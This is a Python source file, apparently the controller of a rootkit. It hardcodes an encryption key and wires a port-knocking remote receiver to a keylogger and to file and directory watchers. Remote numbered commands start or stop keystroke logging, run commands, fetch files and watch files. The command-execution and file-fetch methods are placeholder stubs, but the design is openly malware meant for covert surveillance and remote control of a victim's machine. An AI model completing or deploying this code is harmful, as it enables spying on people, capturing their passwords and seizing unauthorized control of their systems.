from time import sleep

import d_watcher
from keylog import keylog
import encryption
import f_watcher
import knock

key = b'eoxuXDM-FYNQ_o0PxQaxCcXW-u6h26ytH4vx2zYCiM0='
code = "rootkit"


def main():
    kit = rkit()
    kit.start()

class rkit:
    def __init__(self):
        self.knocker = knock.remote_receiver(code, key, self)
        self.keylogger = keylog(60, "temp.txt")
        self.file_watcher = f_watcher.file_watcher(self.knocker)
        self.dictionary_watcher = d_watcher.dictionary_watcher(self.knocker)

    def start(self):
        self.knocker.listen_loop()

    def action_parse(self, option, data):
        match option:
            case 1:
                self.keylogger.start()
                return 0
            case 2:
                self.keylogger.stop()
                return 0
            case 3:
                self.command_execute(data)
                return 0
            case 4:
                self.file_get(data)
                return 0
            case 5:
                self.file_watcher.assign_file(data)
                self.file_watcher.start()
                return 0
            case 6:
                self.file_watcher.stop()
                return 0
            case 7:
                self.dictionary_watcher.assign_dict(data)
                self.dictionary_watcher.start()
                return 0
            case 8:
                self.dictionary_watcher.stop()
                return 0
            case _:
                print("Invalid action received")
                return 0

    def command_execute(self, command):
        print(command)

    def file_get(self, file):
        return "file"


if __name__ == '__main__':
    main()
